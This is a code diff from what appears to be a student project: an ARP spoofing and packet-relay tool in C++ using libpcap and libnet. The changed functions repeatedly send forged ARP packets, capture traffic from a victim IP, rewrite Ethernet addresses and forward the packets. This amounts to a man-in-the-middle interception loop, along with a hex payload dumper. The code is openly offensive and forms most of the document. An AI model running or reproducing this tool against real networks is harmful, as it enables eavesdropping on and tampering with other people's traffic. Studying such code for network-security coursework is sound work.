@@ -45,7 +45,8 @@ void myPCAP::getArpMac(const char *ipaddress, struct ether_addr *victim_mac, int
     		if(fp == NULL){
 				printf("file open error");
 			}
-            fprintf(fp, "%02X:%02X:%02X:%02X:%02X:%02X\n", arph->eth.ether_shost[0], arph->eth.ether_shost[1], arph->eth.ether_shost[2], arph->eth.ether_shost[3], arph->eth.ether_shost[4], arph->eth.ether_shost[5]);
+            fprintf(fp, "%02X:%02X:%02X:%02X:%02X:%02X\n", arph->eth.ether_shost[0], arph->eth.ether_shost[1], arph->eth.ether_shost[2],
+            												 arph->eth.ether_shost[3], arph->eth.ether_shost[4], arph->eth.ether_shost[5]);
             fclose(fp);
             *pflag = 1;
 
@@ -69,6 +70,7 @@ bool myPCAP::isBroadcast(struct in_addr ip){
     	if(memcmp(arph->arp_src_ip, &ip.s_addr, 4) == 0){
     		if(memcmp(arph->eth.ether_dhost, &mac_class.broadcastMac, ETHER_ADDR_LEN) == 0){
     			printf("\n********** FIND: broadcast *********\n");
+
             	return 1;
     		}
     	}
@@ -76,70 +78,68 @@ bool myPCAP::isBroadcast(struct in_addr ip){
     return 0;
 }
 
-int myPCAP::packetRelay(){
+int myPCAP::packetRelay(myIP ip_info, myMAC mac_info, struct in_addr victim_ip, struct ether_addr target_mac){
+	libnet_ethernet_hdr	*ether_header;
+	libnet_ipv4_hdr		*ip_header;
+	const u_char* temp_packet;
+
+	ether_header = (libnet_ethernet_hdr	*)packet;
+	temp_packet = packet + sizeof(libnet_ethernet_hdr);
+
+	if(ntohs(ether_header->ether_type) == ETHERTYPE_IP){
+		ip_header = (libnet_ipv4_hdr *)temp_packet;
+		if( ( memcmp(&ip_header->ip_src.s_addr, &victim_ip.s_addr, sizeof(struct in_addr)) == 0)
+			&& ( memcmp(&ip_header->ip_dst.s_addr, &ip_info.attacker_ip.s_addr, sizeof(struct in_addr)) != 0 )
+			&& ( memcmp(ether_header->ether_dhost, mac_info.my_mac_address.ether_addr_octet, sizeof(struct ether_addr)) == 0 ) ) {
+			printf("********** FIND: [victim > destination] *********\n");
+			memcpy(ether_header->ether_dhost, &target_mac.ether_addr_octet, ETHER_ADDR_LEN);
+			memcpy(ether_header->ether_shost, &mac_info.my_mac_address.ether_addr_octet	, ETHER_ADDR_LEN);
+			if( pcap_sendpacket(pcd, packet, pkthdr->len) == -1 )
+				printf("relay pcap_sendpacket error\n");
+		}
+	}
 	return 1;
 }
 
+int myPCAP::arpSpoofing(myARPheader arph, myIP ip_info, myMAC mac_info, struct in_addr victim_ip, struct ether_addr target_mac){
+	unsigned long long counter = 0;
+	const unsigned long long TIME_LIMIT = 0xfff;
+	int is_packet = 0;
 
-
-
-int pcap_from_victiom(struct in_addr *victimIp, struct in_addr *destIp, struct ether_addr *destMac,
-						struct ether_addr *myMac){
-	struct ether_header *eth;   // ethernet header struct
-    struct ip *iph;				// ip header struct
-    const u_char* temp_packet;
-    int packet_length = 0;
-
-	eth = (struct ether_header *)packet;
-	temp_packet = packet + sizeof(struct ether_header);
-
-	// is it to the dest ip?
-	if(ntohs(eth->ether_type) == ETHERTYPE_IP){
-		iph = (struct ip *) temp_packet;
-		if( ( memcmp( &(iph->ip_dst), &(destIp->s_addr), sizeof(struct in_addr) ) == 0 )
-				&& ( memcmp( eth->ether_dhost, myMac->ether_addr_octet, ETHER_ADDR_LEN ) == 0 ) ){
-			printf("\n********** FIND: [victim > destination] *********\n");
-			print_dump(packet);
-			memcpy(eth->ether_dhost, destMac->ether_addr_octet, ETHER_ADDR_LEN);
-			print_dump(packet);
-			packet_length = pkthdr->len;
-			printf("testestsetsetsetsetsetsetsetset    %d            asodijaoisjdoaijsid\n", packet_length);
-			if(pcap_sendpacket(pcd, packet, packet_length) == -1)
-    			printf("relay pcap_sendpacket error\n");
-		}
-	}
-	
-	// if there is no packet captured or [victim > GW](X)
-	return 0;
-}
-
-
-void myARPheader::arpSpoofing(myARPheader arph){
-	time_t start = 0, end = 0;
-	double gap = 0;
-	int ispacket = 0;
-
-	time(&start);
 	while(1){
-		ispacket = pcap_next_ex(pcd, &pkthdr, &packet);
-		if(ispacket < 0){
+		if(counter % TIME_LIMIT == 0){
+			sendARPpacket(arph);
+			printf("*** SENDING ARP PACKET ***\n");
+			counter = 1;
+		}
+		counter++;
+		// packet capture
+		is_packet = pcap_next_ex(pcd, &pkthdr, &packet);
+		if(is_packet < 0){
 			printf("packet_next error\n");
 			return 0;
 		}
-		else if(ispacket == 0)	continue;
-
-		time(&end);
-		if(difftime(end, start) >= 10){
-			sendARPpacket(arph);
-			time(&start);
-			printf("time expired\n");
-		}
-
-		if(( isbroadcast(victimIp) ) ) {
-			sendARPpacket(arph);
-		}
-
-		//victim->GW가 있으면 잡기. 만약 잡히면 수정해서(source mac) relay
-		pcap_from_victiom(&victimIp, &GWIp, &GWMac, &myMac, device, pcd, pkthdr, packet);
+		else if(is_packet == 0)	continue;
+		packetRelay(ip_info, mac_info, victim_ip, target_mac);
 	}
+}
+
+void myPCAP::dumpPayload(const u_char *payload, int len) {
+	int i;
+	const u_char *ch;
+
+	if(len <= 0)	return;
+
+	ch = payload;
+	printf("       ****** PAYLOAD ******\n");
+	for(i = 0; i < len; i++) {
+		if ( (i % 16) == 0 )	printf("%04x | ", i);
+		printf("%02x ", *ch);
+		ch++;
+
+		if ( ( (i % 16) == 15 ) && (i != 0) )	printf("\n");
+	}
+	
+	printf("\n");
+	return;
 }
